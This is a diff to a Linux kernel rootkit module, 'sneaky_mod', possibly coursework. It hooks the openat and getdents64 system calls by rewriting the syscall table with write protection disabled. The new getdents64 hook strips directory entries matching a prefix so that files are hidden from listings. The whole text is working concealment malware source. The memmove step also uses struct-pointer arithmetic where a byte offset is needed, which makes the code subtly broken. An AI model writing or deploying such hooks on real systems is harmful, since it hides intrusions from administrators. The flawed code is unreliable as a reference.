@@ -36,7 +36,7 @@ int disable_page_rw(void * ptr) {
 //    should expect it find its arguments on the stack (not in registers).
 asmlinkage int (*original_openat)(struct pt_regs *);
 
-asmlinkage int (*original_read)(struct pt_regs *);
+asmlinkage int (*original_getdents64)(struct pt_regs *);
 
 // Define your new sneaky version of the 'openat' syscall
 asmlinkage int sneaky_sys_openat(struct pt_regs * regs) {
@@ -52,12 +52,34 @@ asmlinkage int sneaky_sys_openat(struct pt_regs * regs) {
   return (*original_openat)(regs);
 }
 
-asmlinkage int sneaky_sys_read(struct pt_regs * regs) {
-  char * buffer = (char *)(regs->si);
-  if (strstr(buffer, "sneaky_mod") != NULL) {
-    printk(KERN_INFO "Yes there is a sneaky_mod!");
+typedef struct linux_dirent64 {
+  unsigned long d_ino;
+  off_t d_off;
+  unsigned short d_reclen;
+  char d_type;
+  char d_name[];
+} ld64;
+
+asmlinkage int sneaky_sys_getdents64(struct pt_regs * regs) {
+  int nread = original_getdents64(regs);
+  ld64 * d;
+  int index = 0;
+  while (index < nread) {
+    d = (ld64 *)(regs->si + index);
+    printk(KERN_INFO "The name is: %s, %d, %d, %d",
+           d->d_name,
+           (int)d->d_reclen,
+           nread,
+           index);
+    if (strcmp(d->d_name, PREFIX) == 0) {
+      /* printk(KERN_INFO "Gotcha !, %d", (nread - index - d->d_reclen)); */
+      memmove(d, d + d->d_reclen, nread - index - d->d_reclen);
+      nread -= d->d_reclen;
+    }
+    index += d->d_reclen;
   }
-  return (*original_read)(regs);
+  printk(KERN_INFO "Nread now is: %d", nread);
+  return nread;
 }
 
 static char * value = "sdfkasdlfkjasdlkfj";
@@ -78,10 +100,12 @@ static int initialize_sneaky_module(void) {
   // function address. Then overwrite its address in the system call
   // table with the function address of our new code.
   original_openat = (void *)sys_call_table[__NR_openat];
+  original_getdents64 = (void *)sys_call_table[__NR_getdents64];
   // Turn off write protection mode for sys_call_table
   enable_page_rw((void *)sys_call_table);
 
   sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
+  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents64;
   // You need to replace other system calls you need to hack here
 
   // Turn write protection mode back on for sys_call_table
@@ -99,6 +123,7 @@ static void exit_sneaky_module(void) {
   // This is more magic! Restore the original 'open' system call
   // function address. Will look like malicious code was nevedr there!
   sys_call_table[__NR_openat] = (unsigned long)original_openat;
+  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
 
   // Turn write protection mode back on for sys_call_table
   disable_page_rw((void *)sys_call_table);
